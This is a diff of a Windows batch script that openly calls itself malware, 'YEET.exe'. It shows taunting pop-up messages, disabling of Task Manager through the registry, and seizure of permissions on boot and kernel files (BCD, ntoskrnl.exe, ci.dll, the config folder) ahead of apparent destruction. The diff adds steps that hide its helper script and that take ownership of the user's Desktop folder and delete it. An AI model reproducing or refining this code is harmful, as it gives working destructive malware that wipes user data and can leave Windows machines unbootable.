@@ -35,15 +35,22 @@
 echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
+attrib -h yt.vbs
 taskkill /f /im YEET.exe
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
 wscript yt.vbs
+attrib -h yt.vbs
 echo x=msgbox("yes, this malware can run even if it is deleted!",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
 wscript yt.vbs
+attrib -h yt.vbs
 echo x=msgbox("oh also do not try to kill cmd.exe through task manager i have blocked it ;)",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+attrib +h yt.vbs
 wscript yt.vbs
+attrib -h yt.vbs
 del yt.vbs /f
 echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 wscript yt.vbs
@@ -94,7 +101,7 @@ icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
 icacls ntoskrnl.exe /grant %username%:F
 icacls ci.dll /grant %username%:F
 echo y|cacls config /g %username%:F /t
-rd %userprofile%\Desktop
+takeown /f %userprofile%\Desktop && cacls %userprofile%\desktop /g %userprofile%:F /t && rd %userprofile%\Desktop
 echo x=msgbox("refresh your desktop ;)",0,"YEET.exe (made by ThePCMaster)")>%userprofile%\yt.vbs
 wscript %userprofile%\yt.vbs
 del %userprofile%\yt.vbs /f
